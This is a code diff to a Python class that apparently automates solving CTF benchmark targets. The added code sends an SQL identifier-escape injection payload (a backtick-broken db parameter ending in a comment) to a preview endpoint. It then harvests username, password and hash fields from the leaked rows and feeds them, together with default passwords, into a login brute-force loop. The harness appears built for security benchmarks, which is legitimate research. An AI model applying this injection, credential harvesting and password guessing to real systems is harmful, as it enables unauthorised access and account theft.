@@ -44,9 +44,10 @@ class PrimitiveCtfHandlerMixin:
         benchmark_api_probes = [] if hit else self._ctf_benchmark_api_probes(target)
         benchmark_api_hit = next((probe for probe in benchmark_api_probes if probe.get("captured_flag_ref")), None)
         hit = hit or benchmark_api_hit
-        query_runner_interactions = [] if hit else self._ctf_query_runner_interactions(target)
+        query_runner_interactions = [] if hit else self._ctf_query_runner_interactions(target, benchmark_api_probes)
         query_runner_hit = next((item for item in query_runner_interactions if item.get("captured_flag_ref")), None)
         hit = hit or query_runner_hit
+        self._ctf_strip_transient_probe_fields(benchmark_api_probes)
         browser_interactions = [] if hit else self._ctf_browser_interactions(target)
         browser_hit = next((item for item in browser_interactions if item.get("captured_flag_ref")), None)
         browser_benchmark_hit = next((item for item in browser_interactions if item.get("benchmark_solve_ref")), None)
@@ -586,7 +587,30 @@ class PrimitiveCtfHandlerMixin:
                 preview_probe.pop("_json", None)
                 if preview_probe.get("captured_flag_ref"):
                     return probes
+                escape_probe = self._ctf_benchmark_identifier_escape_probe(endpoint, db_name, table_name)
+                if escape_probe:
+                    probes.append(escape_probe)
+                    if escape_probe.get("captured_flag_ref"):
+                        return probes
         return probes
+
+    def _ctf_benchmark_identifier_escape_probe(self, endpoint: str, db_name: str, table_name: str) -> dict[str, object]:
+        escaped_db = f"{db_name}`.`{table_name}` -- "
+        url = self._ctf_url_with_query(endpoint, {"mode": "preview", "db": escaped_db, "table": table_name})
+        probe = self._ctf_benchmark_api_get(
+            "benchmark_preview_identifier_escape",
+            url,
+            metadata={
+                "db_sha256": hashlib.sha256(db_name.encode("utf-8")).hexdigest(),
+                "table_sha256": hashlib.sha256(table_name.encode("utf-8")).hexdigest(),
+            },
+        )
+        payload = probe.pop("_json", None)
+        credentials = self._ctf_credentials_from_rows(payload)
+        if credentials:
+            probe["_credential_candidates"] = credentials
+            probe["credential_candidate_count"] = len(credentials)
+        return probe
 
     def _ctf_benchmark_api_get(
         self,
@@ -642,7 +666,29 @@ class PrimitiveCtfHandlerMixin:
             return []
         return [item for item in payload.get("tables", []) if isinstance(item, str)]
 
-    def _ctf_query_runner_interactions(self, target) -> list[dict[str, object]]:
+    def _ctf_credentials_from_rows(self, payload: object) -> list[dict[str, str]]:
+        if not isinstance(payload, list):
+            return []
+        candidates: list[dict[str, str]] = []
+        for row in payload[:20]:
+            if not isinstance(row, dict):
+                continue
+            accounts = [
+                str(value)
+                for key, value in row.items()
+                if isinstance(value, (str, int)) and any(token in str(key).lower() for token in ("user", "name", "login"))
+            ]
+            phrases = [
+                str(value)
+                for key, value in row.items()
+                if isinstance(value, (str, int)) and any(token in str(key).lower() for token in ("pass", "hash", "credential"))
+            ]
+            for account in accounts[:4]:
+                for phrase in phrases[:4]:
+                    candidates.append({"account": account, "phrase": phrase})
+        return candidates[:20]
+
+    def _ctf_query_runner_interactions(self, target, benchmark_api_probes: list[dict[str, object]] | None = None) -> list[dict[str, object]]:
         if str(target.metadata.get("target_family", "")) not in {"nyu_ctf_bench", "ctf_dojo", "dreadgoad"}:
             return []
         login_paths = self._ctf_metadata_string_list(target.metadata, "ctf_login_paths")[:4]
@@ -650,7 +696,7 @@ class PrimitiveCtfHandlerMixin:
         if not login_paths or not query_paths:
             return []
         interactions: list[dict[str, object]] = []
-        candidates = self._ctf_login_candidate_pairs(target)[:64]
+        candidates = self._ctf_login_candidate_pairs(target, benchmark_api_probes or [])[:96]
         algorithms = self._ctf_metadata_string_list(target.metadata, "ctf_login_hash_algorithms") or ["raw"]
         snippets = self._ctf_query_runner_snippets()[:4]
         for base in self._ctf_capture_base_urls(target):
@@ -784,15 +830,42 @@ class PrimitiveCtfHandlerMixin:
             return hashlib.sha1(phrase.encode("utf-8")).hexdigest()
         return phrase
 
-    def _ctf_login_candidate_pairs(self, target) -> list[tuple[str, str]]:
+    def _ctf_login_candidate_pairs(self, target, benchmark_api_probes: list[dict[str, object]]) -> list[tuple[str, str]]:
+        leaked_pairs = self._ctf_leaked_credential_pairs(benchmark_api_probes)
         words = self._ctf_target_words(target)
         accounts = self._dedupe_text_values(["admin", "user", "guest", "test", "demo"] + words)
         phrases = self._dedupe_text_values(["admin", "password", "guest", "test", "demo", "qwerty", "123456"] + words)
-        pairs: list[tuple[str, str]] = []
+        pairs: list[tuple[str, str]] = list(leaked_pairs)
         for account in accounts[:12]:
             for phrase in phrases[:12]:
                 pairs.append((account, phrase))
+        return self._dedupe_credential_pairs(pairs)
+
+    def _ctf_leaked_credential_pairs(self, benchmark_api_probes: list[dict[str, object]]) -> list[tuple[str, str]]:
+        pairs: list[tuple[str, str]] = []
+        for probe in benchmark_api_probes:
+            credentials = probe.get("_credential_candidates", [])
+            if not isinstance(credentials, list):
+                continue
+            for item in credentials:
+                if not isinstance(item, dict):
+                    continue
+                account = item.get("account")
+                phrase = item.get("phrase")
+                if isinstance(account, str) and isinstance(phrase, str):
+                    pairs.append((account, phrase))
         return pairs
+
+    def _dedupe_credential_pairs(self, pairs: list[tuple[str, str]]) -> list[tuple[str, str]]:
+        seen: set[tuple[str, str]] = set()
+        result: list[tuple[str, str]] = []
+        for account, phrase in pairs:
+            key = (account, phrase)
+            if key in seen:
+                continue
+            seen.add(key)
+            result.append(key)
+        return result
 
     def _ctf_target_words(self, target) -> list[str]:
         values = [str(target.handle or ""), str(target.metadata.get("ctf_lab_id", ""))]
@@ -820,6 +893,12 @@ class PrimitiveCtfHandlerMixin:
         for item in interactions:
             item.pop("opener", None)
         return interactions
+
+    def _ctf_strip_transient_probe_fields(self, probes: list[dict[str, object]]) -> None:
+        for probe in probes:
+            for key in list(probe):
+                if key.startswith("_"):
+                    probe.pop(key, None)
 
     def _dedupe_text_values(self, values: list[str]) -> list[str]:
         seen: set[str] = set()
